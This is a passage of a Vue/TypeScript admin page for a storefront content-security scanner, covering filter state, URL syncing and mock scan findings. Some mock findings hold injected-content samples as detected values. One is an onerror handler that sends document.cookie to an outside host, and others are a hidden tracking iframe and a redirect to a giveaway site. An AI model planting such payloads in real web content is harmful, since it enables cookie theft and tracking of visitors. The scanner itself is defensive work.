    htmlTagRulesPages.value = response.pages;
  } catch (err: any) {
    htmlTagError.value = extractErrorMessage(err, 'Failed to retrieve HTML tag rules.');
  } finally {
    isHtmlTagLoading.value = false;
  }
};

// ==========================================
// Findings Query/Data States
// ==========================================
const isFindingsLoading = ref(false);
const findingsError = ref<string | null>(null);
const findingSearchQuery = ref('');
const debouncedFindingSearch = refDebounced(findingSearchQuery, 300);
const findingContentType = ref<string>('all');
const findingSeverity = ref<string>('all');
const findingDetector = ref<string>('all');
const findingCategory = ref<string>('all');
const findingReviewStatus = ref<string>('all');
const findingOrdering = ref<string>('-created_at');
const findingPage = ref(1);
const findingPageSize = ref(10);
const findingsData = ref<ContentScanFindingListItem[]>([]);
const findingsCount = ref(0);
const findingsPages = ref(1);

const findingColumns: UiTableColumn<ContentScanFindingListItem>[] = [
  { key: 'id', label: 'Finding ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs font-semibold' },
  { key: 'scan', label: 'Scan ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs text-muted-foreground' },
  { key: 'severity', label: 'Severity', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'review_status', label: 'Review Status', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'content_type', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-semibold' },
  { key: 'object_id', label: 'Object ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'field_name', label: 'Field', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'detector', label: 'Detector', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-medium' },
  { key: 'category', label: 'Category', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
  { key: 'matched_value', label: 'Matched Value', width: '180px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-xs' },
  { key: 'message', label: 'Message', width: '220px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 text-xs text-muted-foreground' },
  { key: 'created_at', label: 'Created At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground font-mono' },
  { key: 'actions', label: '', width: '60px', headerClass: 'px-4 py-3', cellClass: 'px-4 py-3 text-right' }
];

const resetFindingFilters = () => {
  findingSearchQuery.value = '';
  findingContentType.value = 'all';
  findingSeverity.value = 'all';
  findingDetector.value = 'all';
  findingCategory.value = 'all';
  findingReviewStatus.value = 'all';
  findingOrdering.value = '-created_at';
  findingPage.value = 1;
};

const fetchFindings = async () => {
  if (!canViewFindings.value) return;

  isFindingsLoading.value = true;
  findingsError.value = null;

  try {
    const params: ContentScanFindingsQueryParams = {
      page: findingPage.value,
      page_size: findingPageSize.value,
      ordering: findingOrdering.value !== '-created_at' ? findingOrdering.value : undefined
    };

    if (debouncedFindingSearch.value.trim()) {
      params.search = debouncedFindingSearch.value.trim();
    }
    if (findingContentType.value !== 'all') {
      params.content_type = findingContentType.value;
    }
    if (findingSeverity.value !== 'all') {
      params.severity = findingSeverity.value;
    }
    if (findingDetector.value !== 'all') {
      params.detector = findingDetector.value;
    }
    if (findingCategory.value !== 'all') {
      params.category = findingCategory.value;
    }
    if (findingReviewStatus.value !== 'all') {
      params.review_status = findingReviewStatus.value;
    }

    const response = await contentSecurityService.getContentScanFindings(params);
    findingsData.value = response.results;
    findingsCount.value = response.count;
    findingsPages.value = response.pages;
  } catch (err: any) {
    findingsError.value = extractErrorMessage(err, 'Failed to retrieve content scan findings.');
  } finally {
    isFindingsLoading.value = false;
  }
};

const getFindingReviewStatusBadge = (status?: string | null) => {
  const s = status?.toUpperCase() || 'PENDING';
  switch (s) {
    case 'NEEDS_REVIEW':
    case 'PENDING':
      return { variant: 'warning' as const, label: 'Needs Review', class: 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' };
    case 'APPROVED':
    case 'CONFIRMED':
    case 'SUSPICIOUS':
      return { variant: 'error' as const, label: 'Confirmed Risk', class: 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' };
    case 'RESOLVED':
      return { variant: 'info' as const, label: 'Resolved', class: 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30' };
    case 'FALSE_POSITIVE':
    case 'SAFE':
    case 'WHITELISTED':
      return { variant: 'success' as const, label: 'Safe / Whitelisted', class: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' };
    default:
      return { variant: 'secondary' as const, label: status || 'Unknown', class: 'bg-muted text-muted-foreground border-border' };
  }
};

// URL Routing/Query Management
const route = useRoute();
const router = useRouter();

const syncFromRoute = () => {
  if (route.query.mainTab) mainTab.value = route.query.mainTab as any;
  if (route.query.subTab) {
    if (route.query.subTab === 'hidden-content') {
      rulesSubTab.value = 'hidden_content';
    } else {
      rulesSubTab.value = route.query.subTab as any;
    }
  }

  if (mainTab.value === 'findings') {
    if (route.query.search) findingSearchQuery.value = String(route.query.search);
    if (route.query.content_type) findingContentType.value = String(route.query.content_type);
    if (route.query.severity) findingSeverity.value = String(route.query.severity);
    if (route.query.detector) findingDetector.value = String(route.query.detector);
    if (route.query.category) findingCategory.value = String(route.query.category);
    if (route.query.review_status) findingReviewStatus.value = String(route.query.review_status);
    if (route.query.ordering) findingOrdering.value = String(route.query.ordering);
    if (route.query.page) findingPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) findingPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'domains') {
    if (route.query.search) domainSearchQuery.value = String(route.query.search);
    if (route.query.category) domainCategory.value = String(route.query.category);
    if (route.query.severity) domainSeverity.value = String(route.query.severity);
    if (route.query.match_type) domainMatchType.value = String(route.query.match_type);
    if (route.query.is_active) domainIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) domainIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) domainOrdering.value = String(route.query.ordering);
    if (route.query.page) domainPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) domainPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'hidden_content') {
    if (route.query.search) hiddenContentSearchQuery.value = String(route.query.search);
    if (route.query.category) hiddenContentCategory.value = String(route.query.category);
    if (route.query.severity) hiddenContentSeverity.value = String(route.query.severity);
    if (route.query.is_active) hiddenContentIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) hiddenContentIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) hiddenContentOrdering.value = String(route.query.ordering);
    if (route.query.page) hiddenContentPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) hiddenContentPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'obfuscation') {
    if (route.query.search) obfuscationSearchQuery.value = String(route.query.search);
    if (route.query.category) obfuscationCategory.value = String(route.query.category);
    if (route.query.severity) obfuscationSeverity.value = String(route.query.severity);
    if (route.query.is_active) obfuscationIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) obfuscationIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) obfuscationOrdering.value = String(route.query.ordering);
    if (route.query.page) obfuscationPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) obfuscationPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'redirects') {
    if (route.query.search) redirectSearchQuery.value = String(route.query.search);
    if (route.query.category) redirectCategory.value = String(route.query.category);
    if (route.query.severity) redirectSeverity.value = String(route.query.severity);
    if (route.query.is_active) redirectIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) redirectIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) redirectOrdering.value = String(route.query.ordering);
    if (route.query.page) redirectPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) redirectPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'attributes') {
    if (route.query.search) htmlAttributeSearchQuery.value = String(route.query.search);
    if (route.query.category) htmlAttributeCategory.value = String(route.query.category);
    if (route.query.severity) htmlAttributeSeverity.value = String(route.query.severity);
    if (route.query.is_active) htmlAttributeIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) htmlAttributeIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) htmlAttributeOrdering.value = String(route.query.ordering);
    if (route.query.page) htmlAttributePage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) htmlAttributePageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else if (rulesSubTab.value === 'html') {
    if (route.query.search) htmlTagSearchQuery.value = String(route.query.search);
    if (route.query.category) htmlTagCategory.value = String(route.query.category);
    if (route.query.severity) htmlTagSeverity.value = String(route.query.severity);
    if (route.query.is_active) htmlTagIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) htmlTagIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) htmlTagOrdering.value = String(route.query.ordering);
    if (route.query.page) htmlTagPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) htmlTagPageSize.value = parseInt(String(route.query.page_size)) || 10;
  } else {
    if (route.query.search) keywordSearchQuery.value = String(route.query.search);
    if (route.query.category) keywordCategory.value = String(route.query.category);
    if (route.query.severity) keywordSeverity.value = String(route.query.severity);
    if (route.query.match_type) keywordMatchType.value = String(route.query.match_type);
    if (route.query.is_active) keywordIsActive.value = String(route.query.is_active);
    if (route.query.is_enabled) keywordIsEnabled.value = String(route.query.is_enabled);
    if (route.query.ordering) keywordOrdering.value = String(route.query.ordering);
    if (route.query.page) keywordPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) keywordPageSize.value = parseInt(String(route.query.page_size)) || 10;
  }
};

const updateRouteQuery = () => {
  const query: Record<string, any> = { ...route.query };

  query.mainTab = mainTab.value !== 'overview' ? mainTab.value : undefined;
  query.subTab = mainTab.value === 'rules' && rulesSubTab.value !== 'keywords' ? rulesSubTab.value : undefined;

  if (mainTab.value === 'findings') {
    query.search = findingSearchQuery.value || undefined;
    query.content_type = findingContentType.value !== 'all' ? findingContentType.value : undefined;
    query.severity = findingSeverity.value !== 'all' ? findingSeverity.value : undefined;
    query.detector = findingDetector.value !== 'all' ? findingDetector.value : undefined;
    query.category = findingCategory.value !== 'all' ? findingCategory.value : undefined;
    query.review_status = findingReviewStatus.value !== 'all' ? findingReviewStatus.value : undefined;
    query.ordering = findingOrdering.value !== '-created_at' ? findingOrdering.value : undefined;
    query.page = findingPage.value !== 1 ? String(findingPage.value) : undefined;
    query.page_size = findingPageSize.value !== 10 ? String(findingPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'keywords') {
    query.search = keywordSearchQuery.value || undefined;
    query.category = keywordCategory.value !== 'all' ? keywordCategory.value : undefined;
    query.severity = keywordSeverity.value !== 'all' ? keywordSeverity.value : undefined;
    query.match_type = keywordMatchType.value !== 'all' ? keywordMatchType.value : undefined;
    query.is_active = keywordIsActive.value !== 'all' ? keywordIsActive.value : undefined;
    query.is_enabled = keywordIsEnabled.value !== 'all' ? keywordIsEnabled.value : undefined;
    query.ordering = keywordOrdering.value !== '-created_at' ? keywordOrdering.value : undefined;
    query.page = keywordPage.value !== 1 ? String(keywordPage.value) : undefined;
    query.page_size = keywordPageSize.value !== 10 ? String(keywordPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'domains') {
    query.search = domainSearchQuery.value || undefined;
    query.category = domainCategory.value !== 'all' ? domainCategory.value : undefined;
    query.severity = domainSeverity.value !== 'all' ? domainSeverity.value : undefined;
    query.match_type = domainMatchType.value !== 'all' ? domainMatchType.value : undefined;
    query.is_active = domainIsActive.value !== 'all' ? domainIsActive.value : undefined;
    query.is_enabled = domainIsEnabled.value !== 'all' ? domainIsEnabled.value : undefined;
    query.ordering = domainOrdering.value !== '-created_at' ? domainOrdering.value : undefined;
    query.page = domainPage.value !== 1 ? String(domainPage.value) : undefined;
    query.page_size = domainPageSize.value !== 10 ? String(domainPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'hidden_content') {
    query.search = hiddenContentSearchQuery.value || undefined;
    query.category = hiddenContentCategory.value !== 'all' ? hiddenContentCategory.value : undefined;
    query.severity = hiddenContentSeverity.value !== 'all' ? hiddenContentSeverity.value : undefined;
    delete query.match_type;
    query.is_active = hiddenContentIsActive.value !== 'all' ? hiddenContentIsActive.value : undefined;
    query.is_enabled = hiddenContentIsEnabled.value !== 'all' ? hiddenContentIsEnabled.value : undefined;
    query.ordering = hiddenContentOrdering.value !== '-created_at' ? hiddenContentOrdering.value : undefined;
    query.page = hiddenContentPage.value !== 1 ? String(hiddenContentPage.value) : undefined;
    query.page_size = hiddenContentPageSize.value !== 10 ? String(hiddenContentPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'obfuscation') {
    query.search = obfuscationSearchQuery.value || undefined;
    query.category = obfuscationCategory.value !== 'all' ? obfuscationCategory.value : undefined;
    query.severity = obfuscationSeverity.value !== 'all' ? obfuscationSeverity.value : undefined;
    delete query.match_type;
    query.is_active = obfuscationIsActive.value !== 'all' ? obfuscationIsActive.value : undefined;
    query.is_enabled = obfuscationIsEnabled.value !== 'all' ? obfuscationIsEnabled.value : undefined;
    query.ordering = obfuscationOrdering.value !== '-created_at' ? obfuscationOrdering.value : undefined;
    query.page = obfuscationPage.value !== 1 ? String(obfuscationPage.value) : undefined;
    query.page_size = obfuscationPageSize.value !== 10 ? String(obfuscationPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'redirects') {
    query.search = redirectSearchQuery.value || undefined;
    query.category = redirectCategory.value !== 'all' ? redirectCategory.value : undefined;
    query.severity = redirectSeverity.value !== 'all' ? redirectSeverity.value : undefined;
    delete query.match_type;
    query.is_active = redirectIsActive.value !== 'all' ? redirectIsActive.value : undefined;
    query.is_enabled = redirectIsEnabled.value !== 'all' ? redirectIsEnabled.value : undefined;
    query.ordering = redirectOrdering.value !== '-created_at' ? redirectOrdering.value : undefined;
    query.page = redirectPage.value !== 1 ? String(redirectPage.value) : undefined;
    query.page_size = redirectPageSize.value !== 10 ? String(redirectPageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'attributes') {
    query.search = htmlAttributeSearchQuery.value || undefined;
    query.category = htmlAttributeCategory.value !== 'all' ? htmlAttributeCategory.value : undefined;
    query.severity = htmlAttributeSeverity.value !== 'all' ? htmlAttributeSeverity.value : undefined;
    delete query.match_type;
    query.is_active = htmlAttributeIsActive.value !== 'all' ? htmlAttributeIsActive.value : undefined;
    query.is_enabled = htmlAttributeIsEnabled.value !== 'all' ? htmlAttributeIsEnabled.value : undefined;
    query.ordering = htmlAttributeOrdering.value !== '-created_at' ? htmlAttributeOrdering.value : undefined;
    query.page = htmlAttributePage.value !== 1 ? String(htmlAttributePage.value) : undefined;
    query.page_size = htmlAttributePageSize.value !== 10 ? String(htmlAttributePageSize.value) : undefined;
  } else if (mainTab.value === 'rules' && rulesSubTab.value === 'html') {
    query.search = htmlTagSearchQuery.value || undefined;
    query.category = htmlTagCategory.value !== 'all' ? htmlTagCategory.value : undefined;
    query.severity = htmlTagSeverity.value !== 'all' ? htmlTagSeverity.value : undefined;
    delete query.match_type;
    query.is_active = htmlTagIsActive.value !== 'all' ? htmlTagIsActive.value : undefined;
    query.is_enabled = htmlTagIsEnabled.value !== 'all' ? htmlTagIsEnabled.value : undefined;
    query.ordering = htmlTagOrdering.value !== '-created_at' ? htmlTagOrdering.value : undefined;
    query.page = htmlTagPage.value !== 1 ? String(htmlTagPage.value) : undefined;
    query.page_size = htmlTagPageSize.value !== 10 ? String(htmlTagPageSize.value) : undefined;
  } else {
    delete query.search;
    delete query.category;
    delete query.severity;
    delete query.match_type;
    delete query.is_active;
    delete query.is_enabled;
    delete query.ordering;
    delete query.page;
    delete query.page_size;
  }

  router.replace({ query });
};

// Initial Sync
onMounted(() => {
  syncFromRoute();
  fetchDetectionRulesSummary();
  if (canViewKeywords.value) {
    fetchKeywordRules();
  }
  if (canViewDomains.value) {
    fetchDomainRules();
  }
  if (canViewHiddenContent.value) {
    fetchHiddenContentRules();
  }
  if (canViewObfuscation.value) {
    fetchObfuscationRules();
  }
  if (canViewRedirects.value) {
    fetchRedirectRules();
  }
  if (canViewHtmlAttributeRules.value) {
    fetchHtmlAttributeRules();
  }
  if (canViewHtmlTagRules.value) {
    fetchHtmlTagRules();
  }
  if (canViewContentScans.value && mainTab.value === 'results') {
    fetchContentScans();
  }
  if (canViewFindings.value && mainTab.value === 'findings') {
    fetchFindings();
  }
});

// Reactively watch finding filters & trigger fetch
watch(
  [
    debouncedFindingSearch,
    findingContentType,
    findingSeverity,
    findingDetector,
    findingCategory,
    findingReviewStatus,
    findingOrdering,
    findingPageSize
  ],
  () => {
    findingPage.value = 1;
    updateRouteQuery();
    if (mainTab.value === 'findings') {
      fetchFindings();
    }
  }
);

watch(findingPage, () => {
  updateRouteQuery();
  if (mainTab.value === 'findings') {
    fetchFindings();
  }
});

// Reactively watch keyword filters & trigger fetch
watch(
  [
    debouncedKeywordSearch,
    keywordCategory,
    keywordSeverity,
    keywordMatchType,
    keywordIsActive,
    keywordIsEnabled,
    keywordOrdering,
    keywordPageSize
  ],
  () => {
    keywordPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'keywords') {
      fetchKeywordRules();
    }
  }
);

watch(keywordPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'keywords') {
    fetchKeywordRules();
  }
});

// Reactively watch domain filters & trigger fetch
watch(
  [
    debouncedDomainSearch,
    domainCategory,
    domainSeverity,
    domainMatchType,
    domainIsActive,
    domainIsEnabled,
    domainOrdering,
    domainPageSize
  ],
  () => {
    domainPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'domains') {
      fetchDomainRules();
    }
  }
);

watch(domainPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'domains') {
    fetchDomainRules();
  }
});

// Reactively watch hidden content filters & trigger fetch
watch(
  [
    debouncedHiddenContentSearch,
    hiddenContentCategory,
    hiddenContentSeverity,
    hiddenContentIsActive,
    hiddenContentIsEnabled,
    hiddenContentOrdering,
    hiddenContentPageSize
  ],
  () => {
    hiddenContentPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'hidden_content') {
      fetchHiddenContentRules();
    }
  }
);

watch(hiddenContentPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'hidden_content') {
    fetchHiddenContentRules();
  }
});

// Reactively watch obfuscation filters & trigger fetch
watch(
  [
    debouncedObfuscationSearch,
    obfuscationCategory,
    obfuscationSeverity,
    obfuscationIsActive,
    obfuscationIsEnabled,
    obfuscationOrdering,
    obfuscationPageSize
  ],
  () => {
    obfuscationPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'obfuscation') {
      fetchObfuscationRules();
    }
  }
);

watch(obfuscationPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'obfuscation') {
    fetchObfuscationRules();
  }
});

// Reactively watch redirect filters & trigger fetch
watch(
  [
    debouncedRedirectSearch,
    redirectCategory,
    redirectSeverity,
    redirectIsActive,
    redirectIsEnabled,
    redirectOrdering,
    redirectPageSize
  ],
  () => {
    redirectPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'redirects') {
      fetchRedirectRules();
    }
  }
);

watch(redirectPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'redirects') {
    fetchRedirectRules();
  }
});

// Reactively watch HTML attribute filters & trigger fetch
watch(
  [
    debouncedHtmlAttributeSearch,
    htmlAttributeCategory,
    htmlAttributeSeverity,
    htmlAttributeIsActive,
    htmlAttributeIsEnabled,
    htmlAttributeOrdering,
    htmlAttributePageSize
  ],
  () => {
    htmlAttributePage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'attributes') {
      fetchHtmlAttributeRules();
    }
  }
);

watch(htmlAttributePage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'attributes') {
    fetchHtmlAttributeRules();
  }
});

// Reactively watch HTML tag filters & trigger fetch
watch(
  [
    debouncedHtmlTagSearch,
    htmlTagCategory,
    htmlTagSeverity,
    htmlTagIsActive,
    htmlTagIsEnabled,
    htmlTagOrdering,
    htmlTagPageSize
  ],
  () => {
    htmlTagPage.value = 1;
    updateRouteQuery();
    if (rulesSubTab.value === 'html') {
      fetchHtmlTagRules();
    }
  }
);

watch(htmlTagPage, () => {
  updateRouteQuery();
  if (rulesSubTab.value === 'html') {
    fetchHtmlTagRules();
  }
});

watch([mainTab, rulesSubTab], () => {
  updateRouteQuery();
  if (mainTab.value === 'rules') {
    fetchDetectionRulesSummary();
    if (rulesSubTab.value === 'keywords') {
      fetchKeywordRules();
    } else if (rulesSubTab.value === 'domains') {
      fetchDomainRules();
    } else if (rulesSubTab.value === 'hidden_content') {
      fetchHiddenContentRules();
    } else if (rulesSubTab.value === 'obfuscation') {
      fetchObfuscationRules();
    } else if (rulesSubTab.value === 'redirects') {
      fetchRedirectRules();
    } else if (rulesSubTab.value === 'attributes') {
      fetchHtmlAttributeRules();
    } else if (rulesSubTab.value === 'html') {
      fetchHtmlTagRules();
    }
  } else if (mainTab.value === 'results') {
    fetchContentScans();
  } else if (mainTab.value === 'findings') {
    fetchFindings();
  }
});

// Formatting helpers
const formatDate = (dateStr?: string | null): string => {
  if (!dateStr) return 'N/A';
  try {
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return String(dateStr);
    return new Intl.DateTimeFormat('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    }).format(d);
  } catch {
    return String(dateStr);
  }
};

// Scan State
const isScanning = ref(false);
const isRunScanModalOpen = ref(false);
const scanProgress = ref(0);
const scanStepText = ref('');
const lastScanTimestamp = ref('14 minutes ago');
const totalEntitiesScanned = ref(4306);

// Findings Mock Data
const findings = ref<SecurityFinding[]>([
  {
    id: 'SEC-1092',
    contentType: 'Product',
    contentId: '101',
    contentName: 'ASUS ROG Strix GeForce RTX 4090 OC Edition 24GB',
    contentSlug: 'asus-rog-strix-geforce-rtx-4090-oc-edition-24gb',
    categoryName: 'Graphics Cards',
    field: 'description',
    riskScore: 98,
    status: 'Critical',
    severity: 'Critical',
    detector: 'Domain',
    ruleName: 'Blacklisted Promo Host',
    description: 'Blacklisted affiliate casino and promo redirect domain found embedded in description hyperlink.',
    matchedValue: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetBefore: '...equipped with axial-tech fan technology and a patented vapor chamber. For official claims, rebates and rewards visit ',
    contextSnippetMatched: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetAfter: ' to register your warranty and redeem exclusive cashback immediately...',
    lineOffset: 42,
    scannedAt: '2026-08-25 11:52 UTC',
    storefrontUrl: '/product/asus-rog-strix-geforce-rtx-4090-oc-edition-24gb/',
    adminEditUrl: '/admin/products?modal=edit&id=101'
  },
  {
    id: 'SEC-1088',
    contentType: 'Product',
    contentId: '104',
    contentName: 'MSI Katana 15 B13V 15.6" 144Hz Gaming Laptop',
    contentSlug: 'msi-katana-15-b13v-gaming-laptop',
    categoryName: 'Gaming Laptops',
    field: 'specifications',
    riskScore: 92,
    status: 'Critical',
    severity: 'Critical',
    detector: 'HTML',
    ruleName: 'Disallowed iframe Injection',
    description: 'Dangerous inline <iframe> tag with cross-origin external tracking source detected in specification table.',
    matchedValue: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetBefore: '...Display: 15.6" FHD 144Hz IPS-Level Display. ',
    contextSnippetMatched: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetAfter: ' Operating System: Windows 11 Home Advanced Edition...',
    lineOffset: 18,
    scannedAt: '2026-08-25 11:48 UTC',
    storefrontUrl: '/product/msi-katana-15-b13v-gaming-laptop/',
    adminEditUrl: '/admin/products?modal=edit&id=104'
  },
  {
    id: 'SEC-1074',
    contentType: 'Product',
    contentId: '109',
    contentName: 'Corsair Vengeance RGB DDR5 32GB (2x16GB) 6000MHz CL36',
    contentSlug: 'corsair-vengeance-rgb-ddr5-32gb-6000mhz',
    categoryName: 'Memory / RAM',
    field: 'description',
    riskScore: 84,
    status: 'High Risk',
    severity: 'High',
    detector: 'Attribute',
    ruleName: 'Dangerous Inline onerror Handler',
    description: 'Inline JavaScript event attribute `onerror` detected inside custom HTML image element.',
    matchedValue: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetBefore: '...features dynamic ten-zone RGB lighting. <img src="cor-vengeance.png" ',
    contextSnippetMatched: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetAfter: ' class="w-full h-auto" /> Designed for high-frequency overclocking...',
    lineOffset: 27,
    scannedAt: '2026-08-25 11:40 UTC',
    storefrontUrl: '/product/corsair-vengeance-rgb-ddr5-32gb-6000mhz/',
    adminEditUrl: '/admin/products?modal=edit&id=109'
  },
  {
    id: 'SEC-1065',
    contentType: 'Category',
    contentId: '18',
    contentName: 'High Performance Gaming Laptops',
    contentSlug: 'gaming-laptops',
    categoryName: 'Laptops',
    field: 'category_description',
    riskScore: 78,
    status: 'High Risk',
    severity: 'High',
    detector: 'Redirect',
    ruleName: 'External Meta Refresh Redirect',
    description: 'Meta refresh tag detected directing traffic away to unapproved third-party landing page.',
    matchedValue: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetBefore: '...Explore the premier collection of portable computing rigs. ',
    contextSnippetMatched: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetAfter: ' Top-rated brands including ASUS, MSI, Razer, and Lenovo...',
    lineOffset: 5,
    scannedAt: '2026-08-25 11:34 UTC',
    storefrontUrl: '/product-category/gaming-laptops/',
    adminEditUrl: '/admin/categories?modal=edit&id=18'
  },
  {
    id: 'SEC-1052',
    contentType: 'Product',
    contentId: '115',
    contentName: 'Samsung 990 PRO 2TB PCIe 4.0 NVMe M.2 SSD',
    contentSlug: 'samsung-990-pro-2tb-pcie-4-nvme-m2-ssd',
    categoryName: 'Storage / SSD',
    field: 'short_description',
    riskScore: 71,
    status: 'High Risk',
    severity: 'High',
    detector: 'Domain',
    ruleName: 'Unverified External File Host',
    description: 'Link pointing to known unverified file downloading portal in short description.',
    matchedValue: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetBefore: '...Sequential read speeds up to 7,450 MB/s. Official driver package: ',
    contextSnippetMatched: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetAfter: ' for Windows 10 and 11 installation...',
    lineOffset: 12,
    scannedAt: '2026-08-25 11:22 UTC',
    storefrontUrl: '/product/samsung-990-pro-2tb-pcie-4-nvme-m2-ssd/',
    adminEditUrl: '/admin/products?modal=edit&id=115'
  },
  {
    id: 'SEC-1044',
    contentType: 'Product',
    contentId: '122',
    contentName: 'Logitech G Pro X Superlight 2 Wireless Gaming Mouse',
    contentSlug: 'logitech-g-pro-x-superlight-2',
    categoryName: 'Peripherals / Mice',
    field: 'description',
    riskScore: 58,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Keyword',
    ruleName: 'Blacklisted Keyword match: "free crypto giveaway"',
    description: 'Suspicious spam keyword combination detected in customer review snippet or seller note.',
    matchedValue: 'free crypto giveaway',
    contextSnippetBefore: '...Featuring HERO 2 Sensor with 32,000 DPI. Enter our seasonal ',
    contextSnippetMatched: 'free crypto giveaway',
    contextSnippetAfter: ' by adding this product to your public wishlist today...',
    lineOffset: 34,
    scannedAt: '2026-08-25 11:15 UTC',
    storefrontUrl: '/product/logitech-g-pro-x-superlight-2/',
    adminEditUrl: '/admin/products?modal=edit&id=122'
  },
  {
    id: 'SEC-1039',
    contentType: 'Category',
    contentId: '24',
    contentName: 'Mechanical Keyboards & Switches',
    contentSlug: 'keyboards-switches',
    categoryName: 'Peripherals',
    field: 'category_description',
    riskScore: 52,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Hidden Content',
    ruleName: 'Invisible Font Zero-Size Div',
    description: 'Hidden zero-pixel div element containing keyword stuffing detected.',
    matchedValue: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetBefore: '...Custom hot-swappable mechanical keyboards and enthusiast switches. ',
    contextSnippetMatched: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetAfter: ' Browse tactile, linear, and clicky switches...',
    lineOffset: 9,
    scannedAt: '2026-08-25 11:02 UTC',
    storefrontUrl: '/product-category/keyboards-switches/',
    adminEditUrl: '/admin/categories?modal=edit&id=24'
  },
  {
    id: 'SEC-1025',
    contentType: 'Product',
    contentId: '130',
    contentName: 'NZXT Kraken Elite 360 RGB Liquid CPU Cooler with LCD Display',
    contentSlug: 'nzxt-kraken-elite-360-rgb',
    categoryName: 'Cooling / AIO',
